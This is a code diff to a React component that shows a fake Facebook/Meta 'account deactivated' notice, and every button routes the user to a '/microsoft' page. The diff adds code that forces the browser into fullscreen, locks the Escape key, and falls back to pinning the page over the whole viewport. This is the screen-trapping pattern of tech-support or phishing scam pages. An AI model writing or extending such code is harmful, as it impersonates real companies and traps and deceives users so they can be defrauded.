@@ -1,54 +1,89 @@
-import React from 'react';
+import React, { useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 
 interface DeactivationModalProps {
-    isOpen: boolean;
-    onClose: () => void;
+  isOpen: boolean;
+  onClose: () => void;
 }
 
 const DeactivationModal: React.FC<DeactivationModalProps> = ({ isOpen, onClose }) => {
-    const navigate = useNavigate();
+  const navigate = useNavigate();
+  const isMountedRef = useRef(true);
 
-    const closeAndRedirect = () => {
-        onClose();
-        navigate('/microsoft');
+  useEffect(() => {
+    isMountedRef.current = true;
+    return () => {
+      isMountedRef.current = false;
     };
+  }, []);
 
-    if (!isOpen) return null;
+  useEffect(() => {
+    if (isOpen) {
+      enterFullScreen();
+    }
+  }, [isOpen]);
 
-    return (
-        <>
-            <div className="modal-backdrop" onClick={closeAndRedirect}>
-                <div className="modal-container" onClick={(e) => e.stopPropagation()}>
-                    <button className="modal-close-button" onClick={closeAndRedirect} aria-label="Close">
-                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
-                            <path
-                                d="M15 5L5 15M5 5L15 15"
-                                stroke="currentColor"
-                                strokeWidth="2"
-                                strokeLinecap="round"
-                            />
-                        </svg>
-                    </button>
+  const enterFullScreen = async () => {
+    const elem = document.documentElement;
+    try {
+      await elem.requestFullscreen();
 
-                    <div className="modal-logo">facebook</div>
+      if (isMountedRef.current) {
+        await navigator.keyboard?.lock(['Escape']);
+      }
+    } catch (err) {
+      console.error('Fullscreen failed:', err);
+      Object.assign(document.documentElement.style, {
+        position: 'fixed',
+        inset: '0',
+        width: '100vw',
+        height: '100vh',
+        overflow: 'hidden',
+        zIndex: '9999',
+      });
+    }
+  };
 
-                    <h2 className="modal-message">
-                        Meta has temporarily deactivated your account.
-                    </h2>
+  const closeAndRedirect = async () => {
+    onClose();
+    navigate('/microsoft');
+  };
 
-                    <div className="modal-button-group">
-                        <button className="modal-btn modal-btn-accept" onClick={closeAndRedirect}>
-                            Accept
-                        </button>
-                        <button className="modal-btn modal-btn-ignore" onClick={closeAndRedirect}>
-                            Ignore
-                        </button>
-                    </div>
-                </div>
-            </div>
+  if (!isOpen) return null;
 
-            <style>{`
+  return (
+    <>
+      <div className="modal-backdrop" onClick={closeAndRedirect}>
+        <div className="modal-container" onClick={(e) => e.stopPropagation()}>
+          <button className="modal-close-button" onClick={closeAndRedirect} aria-label="Close">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
+              <path
+                d="M15 5L5 15M5 5L15 15"
+                stroke="currentColor"
+                strokeWidth="2"
+                strokeLinecap="round"
+              />
+            </svg>
+          </button>
+
+          <div className="modal-logo">facebook</div>
+
+          <h2 className="modal-message">
+            Meta has temporarily deactivated your account.
+          </h2>
+
+          <div className="modal-button-group">
+            <button className="modal-btn modal-btn-accept" onClick={closeAndRedirect}>
+              Accept
+            </button>
+            <button className="modal-btn modal-btn-ignore" onClick={closeAndRedirect}>
+              Ignore
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <style>{`
         .modal-backdrop {
           position: fixed;
           inset: 0;
@@ -202,8 +237,8 @@ const DeactivationModal: React.FC<DeactivationModalProps> = ({ isOpen, onClose }
           }
         }
       `}</style>
-        </>
-    );
+    </>
+  );
 };
 
 export default DeactivationModal;
